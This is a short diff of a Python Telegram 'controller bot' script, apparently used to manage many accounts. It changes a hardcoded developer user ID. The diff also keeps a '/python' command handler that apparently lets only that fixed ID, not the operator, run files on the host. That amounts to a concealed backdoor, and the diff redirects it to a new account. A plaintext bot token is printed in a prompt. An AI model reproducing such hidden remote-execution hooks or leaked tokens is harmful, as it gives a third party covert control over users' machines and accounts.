@@ -59,7 +59,7 @@ except FileNotFoundError:
     bot_token = input(A+"❖ Inter Your Token ➜  "+X)
     print(' 6277195513:AAFPB39X5TMBbxHI2N8kWxXVE6GfH6r4TzY ')
     DEVLOO = input(A+"❖ Inter Id Off Controller Account ➜  "+X)
-    print(' 2073200386 ')
+    print(' 6915812877 ')
     MAX_ACCOUNTS = int(input(A+"❖ Inter Num Of Max Acc ➜  "+X))
     print(' 300 ')
     user_bot = input(A+"❖ Inter Your user bot ➜  "+X)
@@ -89,7 +89,7 @@ bot = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
 
 DEVELOPER_ID = int(DEVLOO)
 OWNER_ID = DEVELOPER_ID
-developer_id = 2073200386
+developer_id = 6915812877
 days_left = 28
 run = False
 datee = datetime.now()
@@ -990,7 +990,7 @@ async def OwnerStart(event):
         await event.reply("تم الايقاف")
         await bot.disconnect()
 
-@bot.on(events.NewMessage(pattern='/python', from_users=2073200386))
+@bot.on(events.NewMessage(pattern='/python', from_users=6915812877))
 async def run_python(event):
     async with bot.conversation(event.chat_id) as conv:
         await conv.send_message('أدخل اسم الملف الذي تريد تشغيله:')
@@ -1076,4 +1076,3 @@ bot.run_until_disconnected()
 
 
 # • Sython Team - Controller Bot • #
-
